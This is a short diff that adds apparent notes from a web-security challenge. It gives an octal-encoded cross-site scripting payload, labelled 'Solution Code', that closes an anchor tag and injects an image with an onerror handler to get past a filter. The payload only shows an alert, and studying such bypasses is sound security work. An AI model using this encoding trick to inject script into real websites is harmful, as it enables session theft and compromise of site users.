@@ -1,0 +1,3 @@
+In this section, by using the ASCII table, we are able to bypass certain restrictions.
+
+Solution Code= \074\057a\076\074img src=a onerror=\047alert(1)\047\076
